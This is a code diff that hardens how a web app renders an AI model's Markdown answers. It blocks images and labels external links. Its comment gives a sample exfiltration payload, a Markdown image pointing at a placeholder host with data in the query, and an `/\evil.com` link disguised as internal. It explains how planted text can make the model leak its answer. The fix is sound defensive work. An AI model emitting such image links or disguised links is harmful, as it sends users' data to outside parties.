@@ -3,6 +3,8 @@
 import Link from 'next/link';
 import ReactMarkdown, { type Components } from 'react-markdown';
 import remarkGfm from 'remark-gfm';
+import { ExternalLink } from 'lucide-react';
+import { classifyLink } from '@/lib/safeLink';
 
 /**
  * A Zen answer, as Markdown: bold figures, lists, tables, links, inline code.
@@ -17,25 +19,49 @@ import remarkGfm from 'remark-gfm';
  *
  * An internal link (`/companies/…`) goes through the Next router, so the page
  * changes and Zen, which lives in the layout, stays open with the conversation
- * in it. Anything else opens in a new tab.
+ * in it.
+ *
+ * Security fixes plan, H7 and M6:
+ *   - **No images, ever.** `![](https://somewhere/?data)` in text a person
+ *     planted was fetched the moment Zen quoted it — the answer's contents
+ *     sent to that address without a click. An image is shown as a note.
+ *   - **External links show where they go** and open only on a click, in a
+ *     new tab with no opener and no referrer. What counts as internal is
+ *     decided by `classifyLink`, so `/\evil.com` is another site, not a path.
  */
 export function ZenMarkdown({ text, onInternalLink }: { text: string; onInternalLink?: () => void }) {
   const components: Components = {
     a: ({ href, children }) => {
-      if (href && href.startsWith('/') && !href.startsWith('//')) {
+      const link = classifyLink(href);
+      if (link.kind === 'internal') {
         return (
-          <Link href={href} onClick={onInternalLink} className="font-medium text-primary underline underline-offset-2 hover:no-underline">
+          <Link href={link.href} onClick={onInternalLink} className="font-medium text-primary underline underline-offset-2 hover:no-underline">
             {children}
           </Link>
         );
       }
-      if (!href) return <>{children}</>;
+      if (link.kind === 'none') return <>{children}</>;
       return (
-        <a href={href} target="_blank" rel="noopener noreferrer" className="font-medium text-primary underline underline-offset-2 hover:no-underline">
+        <a
+          href={link.href}
+          target="_blank"
+          rel="noopener noreferrer nofollow"
+          referrerPolicy="no-referrer"
+          title={`Opens ${link.host} in a new tab`}
+          className="font-medium text-primary underline underline-offset-2 hover:no-underline"
+        >
           {children}
+          <span className="ml-1 whitespace-nowrap text-micro font-normal text-secondary no-underline">
+            ({link.host}
+            <ExternalLink className="ml-0.5 inline h-3 w-3 align-[-1px]" aria-hidden="true" />)
+          </span>
         </a>
       );
     },
+    // Never fetched: an image in an answer is a way out for the answer's contents.
+    img: ({ alt }) => (
+      <span className="text-micro text-secondary">[image not shown{alt ? `: ${alt}` : ''}]</span>
+    ),
     p: ({ children }) => <p className="my-2 first:mt-0 last:mb-0">{children}</p>,
     strong: ({ children }) => <strong className="font-semibold text-primary">{children}</strong>,
     ul: ({ children }) => <ul className="my-2 list-disc space-y-1 pl-5 first:mt-0 last:mb-0">{children}</ul>,
